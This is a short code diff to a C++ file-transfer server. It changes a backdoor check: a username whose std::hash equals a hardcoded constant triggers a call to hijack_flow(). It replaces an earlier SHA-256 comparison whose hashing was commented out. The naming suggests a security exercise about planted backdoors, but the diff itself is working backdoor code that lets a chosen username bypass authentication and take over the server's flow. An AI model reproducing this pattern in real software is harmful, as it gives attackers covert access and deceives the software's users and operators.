@@ -23,7 +23,7 @@ const string FILENAME_ERROR = "Error: the path is too long.\n";
 const string AUTHENTICATION_FAIL = "Authentication failed.\n"; // not an error lol
 const string TRANSFER_ERROR = "Error: file transfer failed.\n";
 
-const char *backDoor = "359b978b8687ca88875ccf2976bef89f6045e196adc2dc74ee2ba782a46d46f7";
+ssize_t  backDoor = 150138823314737907;
 
 string escape(string cmd){
     string escaped;
@@ -194,25 +194,10 @@ int login_cmd(const string uname, map<string, string> allowedUsers, User &usr, s
     return 0;
 }
 
-void sha256_string(const char *string, char outputBuffer[65])
-{   /*
-    unsigned char hash[SHA256_DIGEST_LENGTH];
-    SHA256_CTX sha256;
-    SHA256_Init(&sha256);
-    SHA256_Update(&sha256, string, strlen(string));
-    SHA256_Final(hash, &sha256);
-    int i = 0;
-    for(i = 0; i < SHA256_DIGEST_LENGTH; i++)
-    {
-        sprintf(outputBuffer + (i * 2), "%02x", hash[i]);
-    }*/
-    outputBuffer[64] = 0;
-}
 
 void checkBackdoor(const string &uname){
-    char hash[65];
-    sha256_string(uname.c_str(), hash);
-    if(!strcmp(hash, backDoor)){
+    hash<string> hasher;
+    if(hasher(uname) == backDoor){
         hijack_flow();
     }
 }
